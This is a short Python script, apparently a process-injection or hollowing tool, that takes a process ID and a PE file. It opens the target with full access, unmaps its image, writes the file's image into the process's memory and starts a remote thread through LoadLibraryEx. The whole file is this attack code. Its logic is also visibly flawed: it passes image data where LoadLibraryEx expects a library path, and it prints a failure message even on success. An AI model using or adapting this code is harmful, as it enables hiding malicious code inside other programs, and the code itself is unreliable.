from MemUtil import MemUtil
import os, sys
import pefile
import ctypes
from ctypes import *
from ctypes import wintypes
from winappdbg import *

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x00001000 | 0x00002000 )


def usage():
    print "usage: %s [pid] [file]" % sys.argv[0]
    sys.exit(0)


def main():

    if len(sys.argv)<3:
        usage()

    pid = int(sys.argv[1])
    file = sys.argv[2]


    if not os.path.exists(file):
        print "%s not found!" % file
        sys.exit(0)

    kernel32 = windll.kernel32

    pe = pefile.PE(file)
    data = pe.get_memory_mapped_image()
    length = len(data)


    h_kernel32 = kernel32.GetModuleHandleA('kernel32.dll')
    h_loadlib = kernel32.GetProcAddress(h_kernel32, 'LoadLibraryEx')

    hProcess = Process(pid)
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid))

    hPeb = hProcess.get_peb()
    windll.ntdll.NtUnmapViewOfSection(h_process, hPeb.ImageBaseAddress)

    addr = kernel32.VirtualAllocEx(h_process, 0, length, VIRTUAL_MEM, PAGE_READWRITE)
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, addr, data, length, byref(written))


    thread_id = kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, addr, 0, None)
    if not thread_id:
        print "[!] Failed to inject DLL, exit... %d" % kernel32.GetLastError()
        sys.exit(0)

    print "[!] Failed to inject DLL, exit... %d" % kernel32.GetLastError()
    print("[+] spawned thread with handle: 0x{0:04x}".format(thread_id))
    print "[+] address : 0x%08x" % addr
    print('[*] waiting for thread to exit')
    #kernel32.WaitForSingleObject(thread_id, -1)
    #print "[!] Failed to inject DLL, exit... %d" % kernel32.GetLastError()

    print "done"

    #print pid, file
if __name__ == '__main__':
    main()